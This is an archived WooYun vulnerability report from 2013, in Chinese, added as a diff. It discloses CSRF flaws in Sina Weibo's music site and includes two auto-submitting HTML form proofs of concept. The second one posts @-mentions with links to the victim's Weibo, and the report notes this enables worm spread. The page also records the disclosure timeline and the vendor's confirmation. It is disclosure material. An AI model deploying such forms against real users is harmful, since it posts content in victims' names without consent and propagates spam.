@@ -1,0 +1,246 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		sina微博某功能限制不严导致CSRF蠕虫  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		sina微博某功能限制不严导致CSRF蠕虫  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/se55i0n">se55i0n</a> 
+</li><li>提交时间：		2013-03-28 11:37</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-03-28：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-03-28：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-04-07：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-04-17：	细节向普通白帽子公开<br/>
+									2013-04-27：	细节向实习白帽子公开<br/>
+									2013-05-12：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">sina微博csrf蠕虫</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">   问题站点在于新浪的微博音乐人,http://music.weibo.com/，站点有个对某个音乐人或作品进行评价回复同时可以同步到自己的sina微博的功能，此处未校验referer导致；<br />
+<br />
+   </p><p class="detail"><a href="../images/28111658c3b49a0455ebf3575db5e74960d41878.png" target="_blank"><img src="../images/28111658c3b49a0455ebf3575db5e74960d41878.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+一、第一处csrf<br />
+<br />
+1）对音乐人的某个作品进行评价并同步到sina微博；<br />
+<br />
+</p><p class="detail"><a href="../images/28111731864d91ed2cbe4a4970e6ec8dca3807b9.png" target="_blank"><img src="../images/28111731864d91ed2cbe4a4970e6ec8dca3807b9.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+2）例子POC如下；<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;body&gt;<br />
+&lt;form id=&quot;se55i0n&quot; name=&quot;se55i0n&quot; action=&quot;http://music.weibo.com/snake/port/snk_song_comment.php&quot; method=&quot;POST&quot;&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;songid&quot; value=&quot;100027028&quot; /&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;text&quot; value=&quot;csrf is a bang!&quot; /&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;towb&quot; value=&quot;true&quot;&gt;<br />
+&lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;<br />
+&lt;/form&gt;<br />
+&lt;script&gt;<br />
+   document.se55i0n.submit();<br />
+&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+3）执行效果见下图；<br />
+<br />
+</p><p class="detail"><a href="../images/28111944e9925cfa0b0b906f26eb62498414767a.png" target="_blank"><img src="../images/28111944e9925cfa0b0b906f26eb62498414767a.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+4）返回微博音乐人查看效果；<br />
+<br />
+</p><p class="detail"><a href="../images/28112111c181caa61a13068ea4919ac6838e420f.png" target="_blank"><img src="../images/28112111c181caa61a13068ea4919ac6838e420f.png" alt="6.png" width="600"/></a></p><p class="detail"><br />
+<br />
+5）这里的回复的内容里过滤了http这个关键字，so，回复内容里无法带链接；<br />
+<br />
+</p><p class="detail"><a href="../images/281122386e4ed4b8679ee087914ae9c6d5aa1593.png" target="_blank"><img src="../images/281122386e4ed4b8679ee087914ae9c6d5aa1593.png" alt="5.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+二、第二处csrf<br />
+<br />
+1）在微博音乐人还有个功能就是，能对某个音乐人“说两句”并同步到自己的sina微博；<br />
+<br />
+</p><p class="detail"><a href="../images/281127058f507ddecb0ed7c4bf3ea88139b5afec.png" target="_blank"><img src="../images/281127058f507ddecb0ed7c4bf3ea88139b5afec.png" alt="8 - Copy.png" width="600"/></a></p><p class="detail"><br />
+<br />
+2）这里可@任意人或多人一起@，内容能够自己定义且在回复内容中能够带上我们的http链接，这就为进一步的传播带来了基础，例子POC如下；<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;body&gt;<br />
+&lt;form id=&quot;se55i0n&quot; name=&quot;se55i0n&quot; action=&quot;http://music.weibo.com/snake/port/snk_artist_sendComment.php&quot; method=&quot;POST&quot;&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;weiboid&quot; value=&quot;3395246757380231&quot; /&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;text&quot; value=&quot;%40se55i0n%3A+go+go+go!http://www.baidu.com&quot; /&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;toweibo&quot; value=&quot;true&quot;&gt;<br />
+&lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;<br />
+&lt;/form&gt;<br />
+&lt;script&gt;<br />
+   document.se55i0n.submit();<br />
+&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+3)运行POC效果；<br />
+<br />
+</p><p class="detail"><a href="../images/28113018376fe6e881f8fbfd574010b27b17068c.png" target="_blank"><img src="../images/28113018376fe6e881f8fbfd574010b27b17068c.png" alt="7.png" width="600"/></a></p><p class="detail"><br />
+<br />
+4）返回微博查看效果；<br />
+<br />
+</p><p class="detail"><a href="../images/2811311150b1e7d2d8bb25b6d41b483505f35d17.png" target="_blank"><img src="../images/2811311150b1e7d2d8bb25b6d41b483505f35d17.png" alt="10.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你们专业 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/se55i0n" title="se55i0n">se55i0n</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-020816" title="sina微博某功能限制不严导致CSRF蠕虫">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-03-28 11:46</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢提供，已安排人员进行修复。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="20816";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
